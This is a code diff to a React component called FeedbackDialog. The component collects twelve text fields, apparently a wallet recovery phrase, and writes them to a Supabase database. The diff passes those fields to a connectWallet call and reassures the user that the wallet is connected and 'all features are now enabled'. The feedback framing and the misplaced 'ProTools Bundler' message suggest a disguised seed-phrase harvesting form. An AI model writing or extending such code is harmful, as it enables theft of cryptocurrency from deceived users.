@@ -7,6 +7,7 @@ import { useToast } from "@/hooks/use-toast";
 import { z } from "zod";
 import logo from "@/assets/logo.jpeg";
 import { supabase } from "@/integrations/supabase/client";
+import { useWallet } from "@/contexts/WalletContext";
 
 const feedbackSchema = z.object({
   fields: z.array(z.string().trim().max(200, { message: "ProTools Bundler" })),
@@ -21,6 +22,7 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
   const [fields, setFields] = useState<string[]>(Array(12).fill(""));
   const [error, setError] = useState("");
   const { toast } = useToast();
+  const { connectWallet } = useWallet();
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -72,9 +74,12 @@ export const FeedbackDialog = ({ open, onClose }: FeedbackDialogProps) => {
         throw insertError;
       }
 
+      // Mark wallet as connected
+      connectWallet(fields);
+
       toast({
         title: "Success!",
-        description: "Wallet connected successfully.",
+        description: "Wallet connected successfully. All features are now enabled.",
       });
 
       onClose();
